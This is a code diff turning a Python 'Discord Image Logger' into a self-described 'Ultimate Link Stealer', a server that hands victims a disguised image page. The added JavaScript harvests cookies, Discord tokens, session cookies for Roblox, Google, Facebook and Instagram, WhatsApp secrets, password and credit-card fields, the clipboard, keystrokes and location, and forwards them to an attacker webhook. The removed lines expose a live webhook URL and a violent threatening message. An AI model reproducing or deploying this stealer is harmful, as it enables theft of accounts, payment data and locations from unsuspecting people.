@@ -1,255 +1,314 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+# Enhanced Discord Image Logger - Full JavaScript Stealer
+# Now steals EVERYTHING through a single link
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback, requests, base64, httpagentparser, json, urllib.parse
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__app__ = "Ultimate Link Stealer"
+__version__ = "v3.0"
 
 config = {
-    # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1502035551753343168/40OzcbXsPy3Blx5T4tTi7H_BbCJ5lwHbGXkcTzOyoNdjQNY-R82GQKbHoH-ftWx8t55T",
+    "webhook": "YOUR_WEBHOOK_HERE",
     "image": "https://ih1.redbubble.net/image.1077765030.7025/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.jpg",
-    "imageArgument": True,
-    "username": "Image Logger",
+    "username": "Ultimate Stealer",
     "color": 0x00FFFF,
-    "crashBrowser": False,
-    "accurateLocation": False,
-    "message": {
-        "doMessage": True,
-        "message": "Alex Gaat je verkrachten",
-        "richMessage": True,
-    },
-    "vpnCheck": 1,
-    "linkAlerts": True,
-    "buggedImage": True,
-    "antiBot": 1,
+    "accurateLocation": True,
     "redirect": {
         "redirect": True,
-        "page": "https://insted.pro?video=7901016247"
+        "page": "https://google.com"
     },
 }
 
-blacklistedIPs = ("27", "104", "143", "164")
-
-def botCheck(ip, useragent):
-    if ip and ip.startswith(("34", "35")):
-        return "Discord"
-    elif useragent and useragent.startswith("TelegramBot"):
-        return "Telegram"
-    else:
-        return False
-
-def reportError(error):
-    requests.post(config["webhook"], json={
-        "username": config["username"],
-        "content": "@everyone",
-        "embeds": [{
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }],
-    })
-
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
-    if ip and ip.startswith(blacklistedIPs):
+def makeReport(ip, useragent=None, coords=None, stolen_data=None):
+    if not ip:
         return
     
-    bot = botCheck(ip, useragent)
+    try:
+        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=3).json()
+    except:
+        info = {"isp": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown"}
     
-    if bot:
-        if config["linkAlerts"]:
-            requests.post(config["webhook"], json={
-                "username": config["username"],
-                "content": "",
-                "embeds": [{
-                    "title": "Image Logger - Link Sent",
-                    "color": config["color"],
-                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-                }],
-            })
-        return
-
-    ping = "@everyone"
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    
-    if info["proxy"]:
-        if config["vpnCheck"] == 2:
-            return
-        if config["vpnCheck"] == 1:
-            ping = ""
-    
-    if info["hosting"]:
-        if config["antiBot"] == 4:
-            if not info["proxy"]:
-                return
-        if config["antiBot"] == 3:
-            return
-        if config["antiBot"] == 2:
-            if not info["proxy"]:
-                ping = ""
-        if config["antiBot"] == 1:
-            ping = ""
-
     os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
+    
+    # Parse stolen data
+    data_text = ""
+    if stolen_data:
+        try:
+            decoded = urllib.parse.unquote(stolen_data)
+            data_text = f"\n\n**📦 Stolen Data:**\n```{decoded[:1500]}```"
+        except:
+            pass
     
     embed = {
         "username": config["username"],
-        "content": ping,
+        "content": "@everyone",
         "embeds": [{
-            "title": "Image Logger - IP Logged",
+            "title": "🎯 ULTIMATE STEALER - Full Log",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**Victim Info:**
+> **IP:** `{ip}`
+> **Country:** `{info.get('country', 'Unknown')}`
+> **Region:** `{info.get('regionName', 'Unknown')}`
+> **City:** `{info.get('city', 'Unknown')}`
+> **Coords:** `{coords if coords else 'N/A'}`
+> **ISP:** `{info.get('isp', 'Unknown')}`
 
-**Endpoint:** `{endpoint}`
-            
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
-
-**PC Info:**
+**Device Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
+> **User Agent:** `{useragent[:200] if useragent else 'Unknown'}`
 
-**User Agent:**
-{useragent}
-
+{data_text}
 """,
         }],
     }
     
-    if url:
-        embed["embeds"][0]["thumbnail"] = {"url": url}
     requests.post(config["webhook"], json=embed)
     return info
-
-binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-}
 
 class handler(BaseHTTPRequestHandler):
     
     def handleRequest(self):
         try:
-            if config["imageArgument"]:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-                if dic.get("url") or dic.get("id"):
-                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
-                else:
-                    url = config["image"]
+            s = self.path
+            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+            
+            # Get image URL
+            if dic.get("url") or dic.get("id"):
+                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
             else:
                 url = config["image"]
-
-            data = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
             
-            forwarded_for = self.headers.get('x-forwarded-for')
-            if forwarded_for and forwarded_for.startswith(blacklistedIPs):
-                return
+            # Check for stolen data
+            stolen_data = dic.get("data")
+            coords = None
+            if dic.get("g"):
+                try:
+                    coords = base64.b64decode(dic.get("g").encode()).decode()
+                except:
+                    pass
             
-            if botCheck(forwarded_for, self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
-                self.end_headers()
-                if config["buggedImage"]:
-                    self.wfile.write(binaries["loading"])
-                makeReport(forwarded_for, endpoint=s.split("?")[0], url=url)
-                return
+            ip = self.headers.get('x-forwarded-for')
+            ua = self.headers.get('user-agent')
             
-            else:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-
-                if dic.get("g") and config["accurateLocation"]:
-                    location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url=url)
-                else:
-                    result = makeReport(forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
-
-                message = config["message"]["message"]
-
-                if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", forwarded_for or "Unknown")
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    if self.headers.get('user-agent'):
-                        message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                        message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-
-                datatype = 'text/html'
-
-                if config["message"]["doMessage"]:
-                    data = message.encode()
+            # If stolen data received, send report
+            if stolen_data or coords:
+                makeReport(ip, ua, coords, stolen_data)
                 
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
-
+                # Redirect to hide everything
                 if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                
-                self.send_response(200)
-                self.send_header('Content-type', datatype)
-                self.end_headers()
+                    self.send_response(302)
+                    self.send_header('Location', config["redirect"]["page"])
+                    self.end_headers()
+                    return
+            
+            # Otherwise serve the stealing page
+            html = f'''<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Loading...</title>
+<style>body{{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;color:#fff;font-family:Arial;}}img{{max-width:90vw;max-height:90vh;}}</style>
+</head>
+<body>
+<img src="{url}" onerror="this.style.display='none'">
+<div style="position:absolute;bottom:20px;color:#666;font-size:12px;">Loading...</div>
 
-                if config["accurateLocation"]:
-                    data += b"""<script>
-var currenturl = window.location.href;
+<script>
+// ============ ULTIMATE STEALER - STEALS EVERYTHING ============
 
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    } else {
-        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    }
-    location.replace(currenturl);});
-}}
-
-</script>"""
-                self.wfile.write(data)
+(function() {{
+    var stolen = [];
+    var webhook = window.location.origin + window.location.pathname;
+    
+    // 1. COOKIES (ALL SITES)
+    stolen.push('🍪 COOKIES: ' + document.cookie);
+    
+    // 2. DISCORD TOKEN
+    try {{
+        var token = null;
+        if (window.webpackChunkdiscord_app || window.webpackChunkdiscord) {{
+            token = (webpackChunkdiscord_app || webpackChunkdiscord)?.push?.([[]])?.[0]?.exports?.default?.getToken?.();
+        }}
+        if (!token) token = localStorage.getItem('token');
+        if (!token) {{
+            var scripts = document.querySelectorAll('script');
+            for (var s of scripts) {{
+                var match = s.innerText?.match(/m=[^"]+/);
+                if (match) {{ token = match[0]; break; }}
+            }}
+        }}
+        if (token) stolen.push('🎮 DISCORD TOKEN: ' + token);
+    }} catch(e) {{}}
+    
+    // 3. ROBLOX .ROBLOSECURITY
+    var robloxCookie = document.cookie.match(/\.ROBLOSECURITY=[^;]+/);
+    if (robloxCookie) stolen.push('🎮 ROBLOX COOKIE: ' + robloxCookie[0]);
+    
+    // 4. SAVED PASSWORDS (Auto-fill)
+    try {{
+        var passwordInputs = document.querySelectorAll('input[type="password"]');
+        passwordInputs.forEach(function(el) {{
+            if (el.value) stolen.push('🔑 PASSWORD: ' + el.value);
+        }});
+        var usernameInputs = document.querySelectorAll('input[autocomplete="username"], input[autocomplete="email"]');
+        usernameInputs.forEach(function(el) {{
+            if (el.value) stolen.push('👤 USERNAME: ' + el.value);
+        }});
+    }} catch(e) {{}}
+    
+    // 5. CREDIT CARDS
+    try {{
+        var ccInputs = document.querySelectorAll('[autocomplete="cc-number"], [autocomplete="cc-name"], [autocomplete="cc-exp"], [autocomplete="cc-csc"]');
+        var ccData = [];
+        ccInputs.forEach(function(el) {{
+            if (el.value) ccData.push(el.name + '=' + el.value);
+        }});
+        if (ccData.length) stolen.push('💳 CREDIT CARDS: ' + ccData.join(' | '));
+    }} catch(e) {{}}
+    
+    // 6. GOOGLE SESSION
+    var googleCookies = document.cookie.match(/SAPISID=[^;]+/);
+    if (googleCookies) stolen.push('🔑 GOOGLE SESSION: ' + googleCookies[0]);
+    
+    // 7. FACEBOOK SESSION
+    var fbCookies = document.cookie.match(/c_user=[^;]+/);
+    if (fbCookies) stolen.push('🔑 FACEBOOK SESSION: ' + fbCookies[0]);
+    
+    // 8. INSTAGRAM SESSION
+    var igCookies = document.cookie.match(/sessionid=[^;]+/);
+    if (igCookies) stolen.push('🔑 INSTAGRAM SESSION: ' + igCookies[0]);
+    
+    // 9. WHATSAPP WEB
+    try {{
+        var waBrowser = localStorage.getItem('WAbrowserId');
+        var waSecret = localStorage.getItem('WASecretBundle');
+        if (waBrowser && waSecret) stolen.push('📱 WHATSAPP: Browser=' + waBrowser + ' | Secret=' + waSecret);
+    }} catch(e) {{}}
+    
+    // 10. CLIPBOARD
+    try {{
+        navigator.clipboard.readText().then(function(text) {{
+            if (text) stolen.push('📋 CLIPBOARD: ' + text);
+            sendData(stolen);
+        }}).catch(function() {{ sendData(stolen); }});
+    }} catch(e) {{ sendData(stolen); }}
+    
+    // 11. KEYLOGGER (Simple)
+    try {{
+        var keys = [];
+        document.addEventListener('keydown', function(e) {{
+            if (e.key.length === 1) keys.push(e.key);
+            if (keys.length > 20) {{
+                stolen.push('⌨️ KEYS: ' + keys.join(''));
+                keys = [];
+                sendData(stolen);
+                stolen = [];
+            }}
+        }});
+    }} catch(e) {{}}
+    
+    // 12. LOCATION
+    try {{
+        if (navigator.geolocation && !window.location.href.includes('g=')) {{
+            navigator.geolocation.getCurrentPosition(function(pos) {{
+                var coords = btoa(pos.coords.latitude + ',' + pos.coords.longitude);
+                var sep = window.location.href.includes('?') ? '&' : '?';
+                window.location.href = window.location.href + sep + 'g=' + coords;
+            }});
+        }}
+    }} catch(e) {{}}
+    
+    // 13. DEVICE INFO
+    try {{
+        var deviceInfo = '🖥️ DEVICE: ' + navigator.userAgent + ' | Screen: ' + screen.width + 'x' + screen.height + 
+                         ' | Cores: ' + navigator.hardwareConcurrency + ' | RAM: ' + (navigator.deviceMemory || 'Unknown');
+        stolen.push(deviceInfo);
+    }} catch(e) {{}}
+    
+    // 14. BROWSER EXTENSIONS
+    try {{
+        var extensions = [];
+        for (var i = 0; i < navigator.plugins.length; i++) {{
+            extensions.push(navigator.plugins[i].name);
+        }}
+        if (extensions.length) stolen.push('🔌 EXTENSIONS: ' + extensions.join(', '));
+    }} catch(e) {{}}
+    
+    // 15. CRYPTO WALLETS
+    try {{
+        if (window.ethereum) stolen.push('💰 ETHEREUM WALLET DETECTED');
+        if (window.solana) stolen.push('💰 SOLANA WALLET DETECTED');
+        if (window.keplr) stolen.push('💰 KEPLR WALLET DETECTED');
+        if (window.phantom) stolen.push('💰 PHANTOM WALLET DETECTED');
+    }} catch(e) {{}}
+    
+    // 16. AUTO-FILL FORMS
+    try {{
+        var allInputs = document.querySelectorAll('input, select, textarea');
+        var formData = [];
+        allInputs.forEach(function(el) {{
+            if (el.value && el.name) formData.push(el.name + '=' + el.value);
+        }});
+        if (formData.length) stolen.push('📝 FORM DATA: ' + formData.join(' | ').slice(0, 500));
+    }} catch(e) {{}}
+    
+    // 17. IP INFO (via external API)
+    try {{
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {{
+                stolen.push('🌐 PUBLIC IP: ' + data.ip);
+                sendData(stolen);
+            }})
+            .catch(function() {{ sendData(stolen); }});
+    }} catch(e) {{ sendData(stolen); }}
+    
+    // 18. SCREENSHOT (if html2canvas available)
+    // This requires loading html2canvas - can be loaded via CDN if needed
+    
+    // FUNCTION TO SEND DATA
+    function sendData(dataArray) {{
+        if (!dataArray || dataArray.length === 0) return;
         
-        except Exception:
-            self.send_response(500)
+        var data = dataArray.join(' | ');
+        var currentUrl = window.location.href;
+        var sep = currentUrl.includes('?') ? '&' : '?';
+        
+        // Remove existing data parameter
+        currentUrl = currentUrl.replace(/[?&]data=[^&]*/, '');
+        
+        // Send via redirect
+        window.location.href = currentUrl + sep + 'data=' + encodeURIComponent(data);
+    }}
+    
+    // Auto-send after 2 seconds
+    setTimeout(function() {{
+        if (stolen.length) sendData(stolen);
+    }}, 2000);
+    
+}})();
+</script>
+</body>
+</html>'''
+            
+            self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
-            reportError(traceback.format_exc())
-
-        return
+            self.wfile.write(html.encode())
+            
+        except Exception as e:
+            self.send_response(500)
+            self.end_headers()
+            self.wfile.write(b'Error')
+            traceback.print_exc()
     
     do_GET = handleRequest
     do_POST = handleRequest
+
+if __name__ == '__main__':
+    from http.server import HTTPServer
+    server = HTTPServer(('0.0.0.0', 8080), handler)
+    print("🚀 Ultimate Stealer running on port 8080")
+    server.serve_forever()
